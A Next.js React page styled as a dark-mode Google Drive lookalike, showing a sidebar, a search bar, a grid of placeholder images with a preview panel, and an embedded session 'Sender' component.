"use client";

import { useParams } from "next/navigation";
import Sender from "@/components/Sender";
import { useState } from "react";

export default function GoPage() {
  const { id } = useParams() as { id: string };
  const [selectedImage, setSelectedImage] = useState<string | null>(null);

  if (!id) {
    return <p className="p-6 text-red-500">Invalid session ID ❌</p>;
  }

  // Demo images (replace with backend later)
  const images = Array.from({ length: 12 }, (_, i) => 
    `https://picsum.photos/400/300?random=${i + 1}`
  );

  return (
    <div className="min-h-screen bg-[#202124] flex font-sans text-[#e8eaed]">
      
      {/* Sidebar - Exact Google Drive Dark Mode */}
      <aside className="hidden md:flex flex-col w-72 bg-[#202124] border-r border-[#3c4043]">
        
        {/* New button - Google Drive dark style */}
        <div className="px-4 pt-4 pb-2">
          <button className="flex items-center justify-center gap-x-2 w-full bg-[#8ab4f8] hover:bg-[#aecbfa] text-[#202124] text-sm font-medium py-3 px-6 rounded-3xl shadow-md active:scale-[0.97] transition-all">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 4v16m8-8H4" />
            </svg>
            <span>New</span>
          </button>
        </div>

        {/* Navigation - Dark Google Drive style */}
        <nav className="flex-1 px-3 py-2 overflow-y-auto text-sm">
          
          {/* My Drive - active */}
          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl bg-[#3c4043] text-[#8ab4f8] font-medium cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="#8ab4f8" viewBox="0 0 24 24">
              <path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-2 12H6V8h12v10z"/>
            </svg>
            <span>My Drive</span>
          </div>

          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl hover:bg-[#3c4043] text-[#dadce0] cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2" />
            </svg>
            <span>Computers</span>
          </div>

          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl hover:bg-[#3c4043] text-[#dadce0] cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
              <path strokeLinecap="round" strokeLinejoin="round" d="M17 20h5v-2a3 3 0 01-5.356-1.857M17 20H7m5-2v-2c0-.656-.126-1.284-.356-1.852M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.284.356-1.852m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0z" />
            </svg>
            <span>Shared with me</span>
          </div>

          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl hover:bg-[#3c4043] text-[#dadce0] cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 8v4l3 3m6-3a9 9 0 01-18 0 9 9 0 0118 0z" />
            </svg>
            <span>Recent</span>
          </div>

          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl hover:bg-[#3c4043] text-[#dadce0] cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
              <path strokeLinecap="round" strokeLinejoin="round" d="M11.48 3.499a.562.562 0 011.04 0l2.125 5.111a.563.563 0 00.475.345l5.518.442c.499.04.701.663.32.987l-4.18 3.568a.563.563 0 00-.182.557l1.285 5.385a.562.562 0 01-.84.61L12 17.25l-4.665 2.437a.562.562 0 01-.84-.61l1.285-5.385a.563.563 0 00-.182-.557l-4.18-3.568a.563.563 0 01.32-.987l5.518-.442a.563.563 0 00.475-.345L11.48 3.5z" />
            </svg>
            <span>Starred</span>
          </div>

          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl hover:bg-[#3c4043] text-[#dadce0] cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
              <path strokeLinecap="round" strokeLinejoin="round" d="M19 7l-.595 12.142A2 2 0 0116.138 21H7.862a2 2 0 01-1.595-1.858L5 7m5 4v6m4-6v6m1-10V9a1 1 0 00-1-1h-4a1 1 0 00-1 1v1M12 4v-1a1 1 0 00-1-1H9a1 1 0 00-1 1v1" />
            </svg>
            <span>Trash</span>
          </div>
        </nav>

        {/* Storage bar - Google Drive dark style */}
        <div className="px-4 py-4 border-t border-[#3c4043] mt-auto">
          <div className="flex items-center justify-between text-xs text-[#9aa0a6] mb-2">
            <span>6.8 GB of 15 GB used</span>
            <span className="text-[#8ab4f8] hover:underline cursor-pointer">Get more storage</span>
          </div>
          <div className="h-2 bg-[#3c4043] rounded-full overflow-hidden">
            <div className="h-2 w-[45%] bg-[#8ab4f8] rounded-full"></div>
          </div>
        </div>
      </aside>

      {/* Main Content Area */}
      <div className="flex-1 flex flex-col">
        
        {/* Top Bar - Exact Google Drive Dark Header */}
        <header className="bg-[#202124] h-14 border-b border-[#3c4043] flex items-center px-4 gap-4 shadow-sm z-10">
          
          {/* Left section - Drive branding */}
          <div className="flex items-center gap-x-2 flex-shrink-0">
            <button className="p-2 rounded-full hover:bg-[#3c4043] md:hidden">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6 text-[#dadce0]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.5">
                <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </button>
            
            {/* Google Drive logo (exact multicolored) */}
            <div className="flex items-center">
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L2 12L12 22L22 12L12 2Z" fill="#4285F4"/>
                <path d="M12 2L22 12L12 22L2 12L12 2Z" fill="#34A853"/>
                <path d="M12 8L18 14L12 20L6 14L12 8Z" fill="#FBBC05"/>
                <path d="M12 8L6 14L12 20L18 14L12 8Z" fill="#EA4335"/>
              </svg>
              <span className="ml-1 text-[22px] font-normal text-[#dadce0] tracking-[-0.5px]">Drive</span>
            </div>
          </div>

          {/* Search bar - exact Google Drive dark style */}
          <div className="flex-1 max-w-[680px] mx-auto">
            <div className="relative">
              <input
                type="text"
                placeholder="Search in Drive"
                className="w-full bg-[#3c4043] hover:bg-[#4d5156] focus:bg-[#4d5156] border border-transparent hover:border-[#5f6368] focus:border-[#8ab4f8] focus:ring-1 focus:ring-[#8ab4f8] h-10 pl-12 pr-4 rounded-3xl text-sm placeholder:text-[#9aa0a6] text-[#e8eaed] focus:outline-none transition-all"
              />
              <div className="absolute left-4 top-1/2 -translate-y-1/2">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5 text-[#9aa0a6]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.75">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 01-14 0 7 7 0 0114 0z" />
                </svg>
              </div>
            </div>
          </div>

          {/* Right section */}
          <div className="flex items-center gap-x-1 flex-shrink-0">
            <button className="p-2 rounded-full hover:bg-[#3c4043] text-[#dadce0]">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M4 6a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2 2 2 0 01-2-2 2 2 0 012-2zm2 2a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zm2 2a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zm2 2a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2z" />
              </svg>
            </button>

            <button className="p-2 rounded-full hover:bg-[#3c4043] text-[#dadce0] relative">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6 6 0 00-9-5.197V8.5m.002 3.5L12 14l-4.998-3.5" />
              </svg>
              <div className="absolute top-1 right-1 w-4 h-4 bg-[#ea4335] text-[10px] text-white rounded flex items-center justify-center font-medium">3</div>
            </button>

            {/* Avatar - Tamjid */}
            <div className="w-8 h-8 bg-[#8ab4f8] text-[#202124] rounded-full flex items-center justify-center text-sm font-medium cursor-pointer hover:ring-2 hover:ring-[#8ab4f8]/50">
              T
            </div>
          </div>
        </header>

        {/* Content Area */}
        <main className="flex-1 p-6 overflow-auto bg-[#202124]">
          
          {/* Mini toolbar - Exact Google Drive dark */}
          <div className="flex items-center justify-between mb-5">
            <div className="flex items-center text-sm text-[#dadce0]">
              <span className="font-medium">My Drive</span>
              <span className="mx-2 text-[#5f6368]">•</span>
              <span className="text-[#9aa0a6]">12 images</span>
            </div>
            
            <div className="flex items-center gap-x-1 bg-[#292a2d] rounded-3xl border border-[#3c4043] shadow-sm p-1">
              {/* Grid view active */}
              <button className="flex items-center justify-center w-9 h-9 rounded-3xl bg-[#3c4043] text-[#8ab4f8]">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4 6a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zM4 12a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zM4 18a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2z" />
                </svg>
              </button>
              
              {/* List view */}
              <button className="flex items-center justify-center w-9 h-9 rounded-3xl hover:bg-[#3c4043] text-[#dadce0]">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.75">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h7" />
                </svg>
              </button>
            </div>
          </div>

          {/* Sender is now ALWAYS visible (no "Send to Session" header) */}
          <div className="mb-8 bg-[#292a2d] rounded-3xl p-6 border border-[#3c4043]">
            <Sender sessionId={id} />
          </div>

          {/* Grid - Exact Google Drive dark cards */}
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 2xl:grid-cols-7 gap-6">
            {images.map((src, i) => (
              <div
                key={i}
                onClick={() => setSelectedImage(src)}
                className="group bg-[#292a2d] rounded-3xl overflow-hidden border border-transparent hover:border-[#5f6368] shadow-sm hover:shadow-2xl transition-all duration-300 cursor-pointer"
              >
                <div className="aspect-video bg-[#202124] relative overflow-hidden">
                  <img
                    src={src}
                    alt={`Image ${i + 1}`}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                  />
                  <div className="absolute inset-0 bg-gradient-to-b from-transparent via-transparent to-black/30 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                </div>

                <div className="px-4 py-3 flex items-center justify-between">
                  <div className="flex-1 min-w-0">
                    <p className="text-sm text-[#e8eaed] font-medium truncate">
                      Image_{i + 1}.jpg
                    </p>
                    <p className="text-xs text-[#9aa0a6]">Just now</p>
                  </div>
                  
                  <button className="opacity-0 group-hover:opacity-100 p-1.5 hover:bg-[#3c4043] rounded-xl transition-colors">
                    <span className="text-xl leading-none text-[#9aa0a6]">⋯</span>
                  </button>
                </div>
              </div>
            ))}
          </div>

          {/* Floating Preview Panel - Only image preview */}
          {selectedImage && (
            <div className="fixed bottom-8 right-8 w-[340px] bg-[#292a2d] rounded-3xl shadow-2xl border border-[#3c4043] overflow-hidden animate-fade-in">
              
              {/* Panel header */}
              <div className="px-5 pt-5 pb-3 border-b border-[#3c4043] flex items-center justify-between">
                <div className="flex items-center gap-x-2">
                  <div className="w-6 h-6 bg-[#8ab4f8] rounded-2xl flex items-center justify-center text-[#202124] text-xs">📸</div>
                  <p className="font-medium">Preview</p>
                </div>
                <button
                  onClick={() => setSelectedImage(null)}
                  className="text-[#9aa0a6] hover:text-[#dadce0] text-2xl leading-none"
                >
                  ✕
                </button>
              </div>

              {/* Image preview only */}
              <div className="p-5">
                <img
                  src={selectedImage}
                  className="w-full aspect-video object-cover rounded-2xl shadow-inner"
                  alt="preview"
                />
              </div>

              {/* Footer actions */}
              <div className="px-5 py-4 border-t border-[#3c4043] bg-[#202124] flex items-center justify-between text-sm">
                <button className="flex items-center gap-x-1 text-[#8ab4f8] hover:underline">
                  <span>Download</span>
                </button>
                <button 
                  onClick={() => setSelectedImage(null)}
                  className="px-6 py-2 bg-[#292a2d] border border-[#5f6368] rounded-3xl text-[#dadce0] hover:bg-[#3c4043] transition"
                >
                  Close
                </button>
              </div>
            </div>
          )}
        </main>
      </div>

      {/* Animation style */}
      <style jsx>{`
        .animate-fade-in {
          animation: fadeIn 0.25s cubic-bezier(0.16, 1, 0.3, 1);
        }

        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translateY(12px) scale(0.95);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }
      `}</style>
    </div>
  );
}